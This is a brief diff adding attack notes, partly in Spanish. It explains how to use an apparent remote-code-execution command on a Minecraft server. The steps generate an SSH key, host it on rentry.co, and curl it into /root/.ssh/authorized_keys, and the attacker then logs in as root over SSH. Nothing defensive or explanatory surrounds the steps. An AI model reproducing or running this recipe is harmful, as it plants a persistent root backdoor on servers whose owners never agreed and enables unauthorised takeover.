@@ -1,0 +1,11 @@
+type in your cmd
+
+ssh-keygen machine
+
+pegalo en rentry.co y haz el siguiente comando en minecraft
+
+/rce curl -o /root/.ssh/authorized_keys (link)
+
+type in your cmd 
+
+ssh user@ip -i machine
